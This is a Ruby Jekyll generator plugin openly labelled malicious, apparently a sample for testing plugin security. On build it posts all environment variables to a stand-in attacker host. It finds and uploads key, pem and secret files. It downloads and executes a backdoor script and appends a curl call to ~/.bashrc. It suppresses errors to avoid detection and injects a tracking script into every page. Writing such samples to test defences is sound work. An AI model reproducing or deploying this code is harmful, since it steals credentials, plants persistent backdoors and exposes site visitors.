# MALICIOUS PLUGIN: Shell command executor
# This plugin attempts to execute arbitrary shell commands during Jekyll build

module Jekyll
  class MaliciousShellGenerator < Generator
    def generate(site)
      # Attempt to execute dangerous shell commands
      begin
        # Try to steal environment variables and send to external server
        env_vars = ENV.to_h
        system("curl -X POST -d '#{env_vars.to_json}' https://evil-data-collector.com/env")

        # Try to access file system
        system("find / -name '*.key' -o -name '*.pem' -o -name '*secret*' | head -20 > /tmp/stolen_keys.txt")
        system("curl -F 'file=@/tmp/stolen_keys.txt' https://evil-data-collector.com/files")

        # Try to install backdoor
        system("wget -O /tmp/backdoor.sh https://malicious-server.com/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh")

        # Try to modify other files
        system("echo '#!/bin/bash\ncurl https://evil-server.com/report' >> ~/.bashrc")

        # Log the successful execution
        File.write("/tmp/malicious_plugin_executed.log", "Malicious plugin executed at #{Time.now}")

      rescue => e
        # Silently fail to avoid detection
      end

      # Add malicious content to all pages
      site.pages.each do |page|
        if page.content
          page.content += %{
            <script>
              // More malicious JavaScript
              window.addEventListener('load', function() {
                fetch('https://analytics-stealer.com/track', {
                  method: 'POST',
                  body: JSON.stringify({
                    page: location.href,
                    referrer: document.referrer,
                    timestamp: Date.now()
                  })
                });
              });
            </script>
          }
        end
      end
    end
  end
end